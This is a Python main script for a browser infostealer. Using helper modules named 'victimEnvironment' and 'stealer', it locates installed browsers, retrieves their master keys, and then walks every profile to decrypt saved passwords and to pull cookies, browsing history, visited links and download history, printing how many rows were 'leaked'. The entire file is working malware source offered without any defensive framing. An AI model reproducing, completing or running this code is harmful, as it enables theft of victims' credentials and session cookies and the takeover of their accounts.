from typing import List
from victimEnvironment import victimEnvironment
from stealer import stealer

if __name__ == "__main__":
    victim = victimEnvironment()
    stealer = stealer()
    existingBrowsers:List[str] = victim.checkBrowserInstallation()
    for browser in existingBrowsers:
        print(f"[+] {browser} is installed")
        print(f"[+] master key: {victim.getMasterKey(victim.browserPath[browser])}")
        
        # get profile
        profileList:List[str] = victim.searchProfiles(victim.browserPath[browser])
        print(f"[+] {browser} has {len(profileList)} profile(s)")

        # get data
        for profile in profileList:
            print(f"[+] - Profile: {profile}")
            credential = stealer.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['loginData']['subPath']}",
                victim.browserCredentialInformation['loginData']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                stealer.extractAndDecryptData
            )

            history = stealer.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['history']['subPath']}",
                victim.browserCredentialInformation['history']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                stealer.extractHistory
            )
            

            visitedLink = stealer.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['visitedLink']['subPath']}",
                victim.browserCredentialInformation['visitedLink']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                stealer.extractVisitedLink
            )
            

            cookie = stealer.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['cookies']['subPath']}",
                victim.browserCredentialInformation['cookies']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                stealer.extractCookie
            )

            downloadHistory = stealer.getData(
                f"{victim.browserPath[browser]}\\{profile}{victim.browserCredentialInformation['downloads']['subPath']}",
                victim.browserCredentialInformation['downloads']['query'],
                victim.getMasterKey(victim.browserPath[browser]),
                stealer.extractDownloadHistory
            )

            print(f"[+] => User password information leaked---------amount: {len(credential):-8} row(s)")
            print(f"[+] => User webpage access history leaked-------amount: {len(history):-8} row(s)")
            print(f"[+] => User webpage access statistics leaked----amount: {len(visitedLink):-8} row(s)")
            print(f"[+] => User cookie leaked-----------------------amount: {len(cookie):-8} row(s)")
            print(f"[+] => User download history leaked-------------amount: {len(downloadHistory):-8} row(s)")